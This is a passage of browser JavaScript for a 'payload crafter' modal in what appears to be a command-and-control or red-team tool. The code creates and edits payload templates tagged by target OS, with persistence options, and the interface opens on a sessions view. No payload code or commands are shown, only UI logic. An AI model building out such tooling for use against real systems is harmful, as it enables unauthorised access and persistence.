  if (listEl) {
    listEl.innerHTML = state.payloads.map((p) =>
      `<button class="pl-start-opt" data-base="${esc(p.id)}">${esc(p.name)}</button>`
    ).join('');
    listEl.querySelectorAll('[data-base]').forEach((b) =>
      b.addEventListener('click', () => startFrom(b.dataset.base, b)));
  }
  $$('.pl-start-opt.blank').forEach((b) =>
    b.addEventListener('click', () => startFrom('__blank__', b)));

  // If editing, populate from existing
  if (existingPayload) {
    if (n) n.value = existingPayload.name || '';
    if (d) d.value = existingPayload.description || '';
    if (f) f.value = existingPayload.default_filename || 'payload.sh';
    if (c) c.value = existingPayload.template || '';
    if (chars) chars.textContent = `${(c?.value || '').length.toLocaleString()} chars`;
    ['linux', 'macos', 'windows'].forEach((os) => {
      const el = $(`#pl-c-${os}`);
      if (el) el.checked = (existingPayload.os || []).includes(os);
    });
    if (pers) pers.checked = !!existingPayload.persistence;
    if (hk) hk.checked = existingPayload.has_key !== false;
    const saveBtn = $('#pl-c-save');
    if (saveBtn) saveBtn.textContent = 'Update';
  } else {
    const saveBtn = $('#pl-c-save');
    if (saveBtn) saveBtn.textContent = 'Save to catalog';
  }

  modal.classList.add('open');
  setTimeout(() => n?.focus(), 100);
}

async function startFrom(id, btn) {
  // highlight selected start-from option
  $$('.pl-start-opt').forEach((el) => el.classList.remove('active'));
  if (btn) btn.classList.add('active');

  const c = $('#pl-c-code'); if (!c) return;
  if (id === '__blank__') {
    c.value = '';
    const chars = $('#pl-c-chars'); if (chars) chars.textContent = '0 chars';
    return;
  }
  const status = $('#pl-c-status'); if (status) status.textContent = 'Loading template…';
  c.value = 'Loading…';
  try {
    const tpl = await fetchTemplate(id);
    c.value = tpl;
    const chars = $('#pl-c-chars'); if (chars) chars.textContent = `${tpl.length.toLocaleString()} chars`;
    const meta = state.payloads.find((x) => x.id === id);
    if (meta) {
      const n = $('#pl-c-name'); if (n && !n.value) n.value = `${meta.name} (copy)`;
      const d = $('#pl-c-desc'); if (d && !d.value) d.value = meta.description || '';
      const f = $('#pl-c-fn'); if (f && meta.default_filename) f.value = meta.default_filename;
      ['linux', 'macos', 'windows'].forEach((os) => {
        const el = $(`#pl-c-${os}`); if (el) el.checked = (meta.os || []).includes(os);
      });
      const pers = $('#pl-c-persist'); if (pers) pers.checked = !!meta.persistence;
      const hk = $('#pl-c-haskey'); if (hk) hk.checked = meta.has_key !== false;
    }
    if (status) status.textContent = '';
  } catch (e) {
    c.value = `# error loading template: ${e.message}`;
    if (status) status.textContent = '';
    toast('error', e.message);
  }
}

function closeCrafter() {
  const modal = $('#pl-crafter');
  if (modal) modal.classList.remove('open');
  crafterState.editingId = null;
}

function saveCraftedPayload() {
  const n = $('#pl-c-name')?.value.trim() || '';
  const d = $('#pl-c-desc')?.value.trim() || '';
  const f = $('#pl-c-fn')?.value.trim() || 'payload.sh';
  const c = $('#pl-c-code')?.value || '';
  const os = ['linux', 'macos', 'windows'].filter((x) => $(`#pl-c-${x}`)?.checked);
  const persistence = !!$('#pl-c-persist')?.checked;
  const has_key = !!$('#pl-c-haskey')?.checked;

  if (!n) { $('#pl-c-name')?.focus(); toast('error', 'Name is required'); return; }
  if (!c.trim()) { $('#pl-c-code')?.focus(); toast('error', 'Code is required'); return; }
  if (!os.length) { toast('error', 'Select at least one target OS'); return; }

  const list = loadCustomPayloads();
  const now = Date.now();

  if (crafterState.editingId) {
    const idx = list.findIndex((x) => x.id === crafterState.editingId);
    if (idx >= 0) {
      list[idx] = {
        ...list[idx],
        name: n, description: d, default_filename: f,
        os, persistence, has_key, template: c, updated_at: now,
      };
      saveCustomPayloads(list);
      toast('success', `Updated "${n}"`);
      closeCrafter();
      if (state.selectedPayloadId === crafterState.editingId) {
        const saved = crafterState.editingId;
        renderPayloadList();
        setTimeout(() => selectPayload(saved), 50);
      } else { renderPayloadList(); }
      return;
    }
  }

  // create new
  const id = newCustomId();
  const payload = {
    id,
    name: n,
    description: d,
    category: 'custom',
    os,
    requires: [],
    persistence,
    default_filename: f,
    has_key,
    template: c,
    custom: true,
    created_at: now,
    updated_at: now,
  };
  list.push(payload);
  saveCustomPayloads(list);
  toast('success', `Crafted "${n}"`);
  closeCrafter();
  renderPayloadList();
  setTimeout(() => selectPayload(id), 50);
}

/* ─── init ─── */
switchView('sessions');
